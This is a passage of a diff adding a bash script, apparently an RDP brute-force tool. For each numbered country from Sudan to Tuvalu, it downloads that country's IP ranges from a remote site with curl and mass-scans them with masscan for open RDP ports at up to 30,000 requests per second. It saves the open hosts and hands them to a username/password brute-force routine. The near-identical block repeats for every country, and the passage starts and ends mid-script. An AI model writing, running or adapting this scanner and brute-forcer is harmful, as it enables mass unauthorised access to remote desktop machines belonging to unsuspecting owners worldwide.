+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "173" ]; then
+curl http://ipdiapazon.16mb.com/Sudan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "174" ]; then
+curl http://ipdiapazon.16mb.com/Suriname.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "175" ]; then
+curl http://ipdiapazon.16mb.com/Swaziland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "176" ]; then
+curl http://ipdiapazon.16mb.com/Sweden.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "177" ]; then
+curl http://ipdiapazon.16mb.com/Switzerland.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "178" ]; then
+curl http://ipdiapazon.16mb.com/Syrian.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "179" ]; then
+curl http://ipdiapazon.16mb.com/Taiwan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "180" ]; then
+curl http://ipdiapazon.16mb.com/Tajikistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "181" ]; then
+curl http://ipdiapazon.16mb.com/Tanzania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "182" ]; then
+curl http://ipdiapazon.16mb.com/Thailand.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "183" ]; then
+curl http://ipdiapazon.16mb.com/Togo.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "184" ]; then
+curl http://ipdiapazon.16mb.com/Tonga.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "185" ]; then
+curl http://ipdiapazon.16mb.com/Trinidad.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "186" ]; then
+curl http://ipdiapazon.16mb.com/Tunisia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "187" ]; then
+curl http://ipdiapazon.16mb.com/Turkey.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "188" ]; then
+curl http://ipdiapazon.16mb.com/Turkmenistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "189" ]; then
+curl http://ipdiapazon.16mb.com/Tuvalu.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
